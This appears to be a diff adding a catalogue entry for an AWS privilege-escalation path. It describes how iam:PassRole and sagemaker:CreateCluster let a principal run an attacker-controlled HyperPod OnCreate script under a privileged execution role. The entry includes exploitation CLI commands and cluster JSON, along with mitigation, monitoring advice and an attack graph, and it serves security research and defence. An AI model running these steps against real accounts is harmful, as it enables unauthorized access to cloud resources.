@@ -1,0 +1,110 @@
+id: sagemaker-007
+name: iam:PassRole + sagemaker:CreateCluster
+category: new-passrole
+services:
+  - iam
+  - sagemaker
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must cover a privileged execution role trusted by sagemaker.amazonaws.com
+    - permission: sagemaker:CreateCluster
+      resourceConstraints: Must permit creation of the HyperPod cluster with an instance group using the passable role
+  additional:
+    - permission: sagemaker:AddTags
+      resourceConstraints: Required if the creation request includes tags or account policy requires them
+    - permission: sagemaker:DescribeCluster
+      resourceConstraints: Helpful for confirming cluster provisioning status
+description: A principal with `iam:PassRole` and `sagemaker:CreateCluster` can create a SageMaker HyperPod cluster whose instance group uses a privileged execution role and an attacker-controlled OnCreate lifecycle script in S3. During node provisioning, SageMaker runs that script with the execution role's credentials. The access obtained is limited to the role's permissions.
+prerequisites:
+  admin:
+    - A passable role trusts sagemaker.amazonaws.com and has administrative permissions, such as AdministratorAccess or an equivalent custom policy.
+    - The attacker controls an OnCreate script at an S3 location readable by the execution role, and HyperPod capacity and network prerequisites are satisfied.
+  lateral:
+    - A passable role trusts sagemaker.amazonaws.com and has permissions beyond those of the attacker.
+    - The attacker controls an OnCreate script at an S3 location readable by the execution role, and HyperPod capacity and network prerequisites are satisfied.
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > cluster.json <<'JSON'
+        {
+          "ClusterName": "TARGET_CLUSTER",
+          "InstanceGroups": [{
+            "InstanceGroupName": "controller",
+            "InstanceType": "ml.t3.medium",
+            "InstanceCount": 1,
+            "SlurmConfig": {"NodeType": "Controller"},
+            "LifeCycleConfig": {
+              "SourceS3Uri": "s3://CONTROLLED_BUCKET/scripts/",
+              "OnCreate": "on_create.sh"
+            },
+            "ExecutionRole": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "ThreadsPerCore": 1
+          }],
+          "Orchestrator": {"Slurm": {}}
+        }
+        JSON
+        aws sagemaker create-cluster --cli-input-json file://cluster.json
+      description: Create the HyperPod cluster using a pre-staged OnCreate script. A minimal test script can run `aws sts get-caller-identity` and record the result in a permitted destination.
+    - step: 2
+      command: |
+        aws sagemaker describe-cluster --cluster-name TARGET_CLUSTER
+      description: Optional status check; the OnCreate script runs as nodes are provisioned.
+recommendation: |
+  Privileged service roles combined with broad `iam:PassRole` and `sagemaker:CreateCluster` grants make this path exploitable. Give HyperPod execution roles only the permissions needed by their workloads. Scope `iam:PassRole` to approved roles and use the `iam:PassedToService` condition for `sagemaker.amazonaws.com`. Restrict who may create clusters and which S3 script locations they may supply. Monitor CloudTrail `CreateCluster` events and review `InstanceGroups[].ExecutionRole` and `InstanceGroups[].LifeCycleConfig` for unfamiliar roles or S3 locations. Audit HyperPod role permissions and lifecycle scripts regularly.
+limitations: |
+  The execution role must be passable to SageMaker and able to read the lifecycle script from S3. Cluster creation can require service quotas, capacity, network setup, and account-specific tagging permissions. Administrative access occurs only when the passed role is administrative; otherwise the result is bounded by that role.
+discoveryAttribution:
+  firstDocumented:
+    author: Daniel Grzelak
+    organization: Plerion
+    date: 2026
+references:
+  - title: AWS CreateCluster API
+    url: https://docs.aws.amazon.com/sagemaker/latest/APIReference/API_CreateCluster.html
+  - title: AWS SageMaker HyperPod Slurm setup
+    url: https://docs.aws.amazon.com/sagemaker/latest/dg/smcluster-getting-started-slurm-cli.html
+  - title: AWS SageMaker service authorization reference
+    url: https://docs.aws.amazon.com/service-authorization/latest/reference/list_sagemaker.html
+relatedPaths:
+  - sagemaker-001
+attackVisualization:
+  nodes:
+    - id: attacker
+      label: Starting principal
+      type: principal
+      description: Can create HyperPod clusters and pass the target execution role.
+    - id: cluster
+      label: New HyperPod cluster
+      type: resource
+      description: Instance group points to an attacker-controlled OnCreate script in S3.
+    - id: script
+      label: OnCreate lifecycle script
+      type: payload
+      description: Runs on a newly provisioned cluster node.
+    - id: role
+      label: HyperPod execution role
+      type: principal
+      description: The role assigned to the instance group.
+    - id: outcome
+      label: Execution role access
+      type: outcome
+      description: Code on the node can use the execution role's permissions.
+  edges:
+    - from: attacker
+      to: cluster
+      label: iam:PassRole + sagemaker:CreateCluster
+      description: Create the cluster with the privileged role and lifecycle script location.
+    - from: cluster
+      to: script
+      label: Node provisioning
+      description: The OnCreate script runs when SageMaker provisions the node.
+    - from: script
+      to: role
+      label: Execution role credentials
+      description: The script can use credentials supplied to the node.
+    - from: role
+      to: outcome
+      label: Role permissions
+      description: Access is limited to permissions granted to the execution role.
